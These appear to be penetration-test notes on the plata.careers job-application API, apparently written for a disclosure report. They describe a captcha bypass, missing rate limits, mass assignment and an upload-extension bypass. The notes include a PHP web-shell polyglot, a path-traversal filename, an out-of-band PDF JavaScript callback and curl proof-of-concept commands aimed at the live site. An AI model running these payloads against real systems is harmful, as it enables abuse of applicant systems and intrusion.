# Reference: verified engagement details (plata.careers, Sep 2026)

## Target context
- Careers properties: `plata.careers` (primary), `careers.bancoplata.mx` → 301 → `plata.careers`, `career.platacard.mx` → 301 → `plata.careers/vacancy`.
- Site is Framer SSG; all app logic in `_fuc/sites/<site-id>/*.mjs` ESM modules.
- ATS = Greenhouse (job JSON shape: `absolute_url`, `internal_job_id`, `requisition_id`, `metadata[]`, `data_compliance[]`, `first_published`, `content` HTML-escaped).
- Wrapper: `https://plata.careers/api-internal` (constant `gt` in module `9U4I8oFHyFeARbPOxEMJ*.mjs`).

## Endpoint map (verified)
| Endpoint | Method | Notes |
|---|---|---|
| `/api-internal/jobs` | GET | 156 jobs, ~1.58 MB with `?content=true`; `?content=false` same size (param ignored) |
| `/api-internal/jobs/<id>` | GET | single job |
| `/api-internal/apply-job?jobid=<id>` | POST | write primitive; JSON body |
| `/api-internal/<anything-else>` | GET | `{"error":"404 - Route not found"}` — no other proxied routes exposed |
| `https://plata.careers/api/v1/pl-landing/client-log` (main site) | POST | logging sink, unrelated |

## Turnstile details
- Sitekey: `0x4AAAAAADq8EHf3AS00ZsfG` (from `JobApplicationConstants.BpucpbmN.mjs`, var `r`).
- Client code: `let a=await fetch(...); let t=null; try{t=await De()}catch{...}; let r={"Content-Type":"application/json"}; t&&(r["cf-turnstile-response"]=t);` → header **only when a token exists**.
- Server: POST **without** header → `200 {"success":"Candidate saved successfully"}`.
- POST **without** jobid param → `403 {"error":"turnstile_missing"}` → validation order: jobid lookup first, then turnstile, then save.
- Error taxonomy: missing fields → `422 {"status":422,"error":"Invalid attributes: first_name,last_name,email"}`; `first_name` >255 chars → `422 Must not be greater than 255 characters long: first_name`; ghost jobid → `401 {"status":401,"error":"Failed to save person"}`; `%20OR%201=1` in jobid → Cloudflare challenge block (WAF present).

## Verified abuse results
- 6 consecutive submissions to job 5389990008, all 200, ~1.1s total, no 429.
- 3 submissions with identical name+email → 3× "saved successfully" (no dedup).
- Closed jobs (oldest IDs 4147749008, 4147765008) accepted applications.
- Mass-assignment keys (`admin`, `role`, `owner_id`, `source`, `tags`, `internal`) accepted silently.
- Resume upload: `resume_content` (base64) + `resume_content_filename`.
  - PDF w/ PHP polyglot (`%PDF-1.4 ... <?php system($_GET['c']); ?>`) named `resume.pdf` → 200.
  - `resume.pd`, `resume.PDF.php`, `resume.pdf%00.php`, `resume.pdf.exe` → 422 unsupported type.
  - `resume.php.pdf` → 200 (extension allowlist checks LAST extension).
  - `../../evil.pdf` → 200 (filename stored unsanitized).
  - HTML → 422; SVG → 422 (only on resume AND cover_letter).
- OOB: PDF `/AA <</O <</S/JavaScript/JS (this.submitForm('https://OAST/pdf-submit'))>>>>` and DOCX `word/_rels/document.xml.rels` relationship → Target external URL. **Zero callbacks** → no server-side parsing of attachments; RCE claim retracted, reported as content-injection.

## Candidate-recording caveats
- Candidate emails used: mailinator pattern `hxmarkNNNN@mailinator.com` (disposable, no real PII).
- Job IDs used: the published listing's own IDs (public data). No scraping of other candidates' data was performed.

## Reproduction commands
```bash
# turnstile bypass PoC (replace jobid with any live listing id)
curl -sk -X POST 'https://plata.careers/api-internal/apply-job?jobid=5389990008' \
  -H 'Content-Type: application/json' \
  -d '{"first_name":"poc","last_name":"turnstile","email":"poc-turnstile@mailinator.com"}'
# → 200 {"success":"Candidate saved successfully"} with NO cf-turnstile-response header

# rate-limit / dedup PoC: run the above 6 times, same email → 6× 200

# extension-check bypass PoC (content not inspected)
PDF=$(printf '%%PDF-1.4\n<?php system($_GET["c"]); ?>' | base64 -w0)
curl -sk -X POST 'https://plata.careers/api-internal/apply-job?jobid=5389990008' \
  -H 'Content-Type: application/json' \
  -d "{\"first_name\":\"poc\",\"last_name\":\"upload\",\"email\":\"poc-upload@mailinator.com\",\"resume_content\":\"$PDF\",\"resume_content_filename\":\"resume.php.pdf\"}"
```
